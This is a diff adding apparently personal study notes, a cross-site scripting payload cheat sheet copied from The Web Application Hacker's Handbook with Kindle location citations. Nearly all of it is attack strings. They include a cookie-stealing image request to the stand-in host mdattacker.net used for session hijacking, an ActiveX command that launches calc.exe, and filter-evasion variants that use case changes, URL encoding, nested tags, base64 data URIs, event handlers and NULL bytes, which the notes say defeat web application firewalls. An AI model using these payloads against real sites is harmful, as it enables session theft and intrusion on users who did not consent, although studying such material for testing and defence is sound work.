@@ -24,3 +24,108 @@ var i=new Image; i.src="http://mdattacker.net/"+document.cookie;
  7. The attacker monitors requests to mdattacker.net and receives the user's request. He uses the captured token to hijack the user's session, gaining access to that user's personal information and performing arbitrary actions “as” the user.
 
 Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 11652-11656). Wiley. Kindle Edition. 
+
+Launch Calc
+<script>
+    var o = new ActiveXObject('WScript.shell');
+    o.Run('calc.exe');
+</script>
+
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 11881-11882). Wiley. Kindle Edition. 
+
+"><script>alert(document.cookie)</script>
+
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 11992-11993). Wiley. Kindle Edition. 
+
+"><script >alert(document.cookie)</script >
+"><ScRiPt>alert(document.cookie)</ScRiPt>
+"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+%00"><script>alert(document.cookie)</script>
+
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12014-12017). Wiley. Kindle Edition. 
+
+<input type="text" name="address1" value="myxsstestdmqlwp">
+"><script>alert(1)</script>
+" onfocus="alert(1)
+
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12090). Wiley. Kindle Edition. 
+
+<script>var a = ‘myxsstestdmqlwp’; var b = 123; ... </script>
+'; alert(1); var foo='
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12094-12095). Wiley. Kindle Edition. 
+
+<a href="myxsstestdmqlwp">Click here ...</a>
+javascript:alert(1);
+#"onclick="javascript:alert(1)
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12120). Wiley. Kindle Edition. 
+
+Base64
+<object data="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+Click here</a>
+ The Base64-encoded string in the preceding examples is: <script>alert(1)</script>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12184-12189). Wiley. Kindle Edition. 
+
+No user Interaction
+<xml onreadystatechange=alert(1)>
+<style onreadystatechange=alert(1)>
+<iframe onreadystatechange=alert(1)>
+<object onerror=alert(1)>
+<object type=image src=valid.gif onreadystatechange=alert(1)></object>
+<img type=image src=valid.gif onreadystatechange=alert(1)>
+<input type=image src=valid.gif onreadystatechange=alert(1)>
+<isindex type=image src=valid.gif onreadystatechange=alert(1)>
+<script onreadystatechange=alert(1)>
+<bgsound onpropertychange=alert(1)>
+<body onbeforeactivate=alert(1)>
+<body onactivate=alert(1)>
+<body onfocusin=alert(1)>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12194-12199). Wiley. Kindle Edition. 
+
+HTML 5 No user interaction 
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<body onscroll=alert(1)><br><br>...<br><input autofocus>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12203-12204). Wiley. Kindle Edition. 
+
+Closing Tags
+</a onmousemove=alert(1)>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12207). Wiley. Kindle Edition. 
+
+Finally, HTML5 introduces new tags with event handlers: <video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12209-12211). Wiley. Kindle Edition.
+
+Script pseudo-protocols can be used in various locations to execute inline script within an attribute that expects a URL. 
+Here are some examples: 
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12213-12216). Wiley. Kindle Edition. 
+
+<form id=test /><button form=test formaction=javascript:alert(1)>
+<event-source src=javascript:alert(1)>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12223). Wiley. Kindle Edition. 
+
+
+dynamically evaluated CSS styles. The following example works on IE7 and earlier, and also on later versions when running
+in compatibility mode: <x style=x:expression(alert(1))>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12229-12231). Wiley. Kindle Edition. 
+
+
+IE Only - Later Versions
+<x style=behavior:url(#default#time2) onbegin=alert(1)>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12235-12236). Wiley. Kindle Edition. 
+
+you can insert NULL bytes at any position: <[%00]img onerror=alert(1) src=a>
+<i[%00]mg onerror=alert(1) src=a>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12261-12263). Wiley. Kindle Edition. 
+Using NULL bytes has historically proven effective against web application firewalls (WAFs) configured to block 
+requests containing known attack strings. Because WAFs typically are written in native code for performance reasons, 
+a NULL byte terminates the string in which it appears. This prevents the WAF from seeing the malicious payload that 
+comes after the NULL
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12273-12275). Wiley. Kindle Edition. 
+
+
